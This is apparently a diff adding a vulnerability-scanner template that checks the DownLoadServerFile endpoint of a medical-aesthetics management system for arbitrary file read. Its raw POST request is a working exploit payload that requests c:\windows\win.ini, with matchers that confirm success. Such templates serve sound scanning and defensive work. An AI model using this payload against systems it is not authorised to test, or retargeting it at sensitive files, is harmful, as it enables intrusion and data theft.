@@ -1,0 +1,35 @@
+id: hongmai-DownLoadServerFile-fileread
+
+info:
+  name: hongmai-DownLoadServerFile-fileread
+  author: HuanXiong
+  severity: medium
+  description: |
+    宏脉医美行业管理系统存在任意文件读取漏洞
+
+  tags: File Reading
+
+http:
+  - raw:
+      - |
+        POST /zh-CN/PublicInterface/DownLoadServerFile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+        Content-Length: 28
+
+        filePath=c:\\\\windows\\\\win.ini
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[fonts]"
+          - "[extensions]"
